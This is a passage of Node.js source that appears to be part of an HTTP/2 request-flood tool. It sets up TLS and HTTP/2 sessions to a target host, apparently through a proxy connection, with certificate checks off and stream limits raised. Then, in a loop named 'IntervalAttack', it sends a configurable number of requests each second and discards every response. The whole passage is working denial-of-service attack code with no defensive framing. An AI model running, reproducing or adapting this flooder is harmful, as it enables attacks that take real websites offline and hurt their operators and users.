          sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
      
          // Elliptic curves preference for ECDHE
          ecdhCurve: "X25519:P-256:P-384:P-521",
      
          secure: true,
          rejectUnauthorized: false,          // ignore invalid certs (use with caution)
      
          port: 443,
          servername: parsedTarget.host,       // same as above, no uri needed
          
          sessionTimeout: 5000,
      
          // Disable compression (compression is bad security-wise)
          enableTrace: false,
      };
      

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: {
           headerTableSize: 65536,
           maxConcurrentStreams: 1000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
           headerTableSize: 65536,
           maxConcurrentStreams: 20000,
           initialWindowSize: 6291456,
           maxHeaderListSize: 262144,
           enablePush: false
         });

        client.on("connect", () => {
           const IntervalAttack = setInterval(() => {
               for (let i = 0; i < args.Rate; i++) {
                   const request = client.request(headers)
                   
                   .on("response", response => {
                       request.close();
                       request.destroy();
                       return
                   });
   
                   request.end();
               }
           }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}


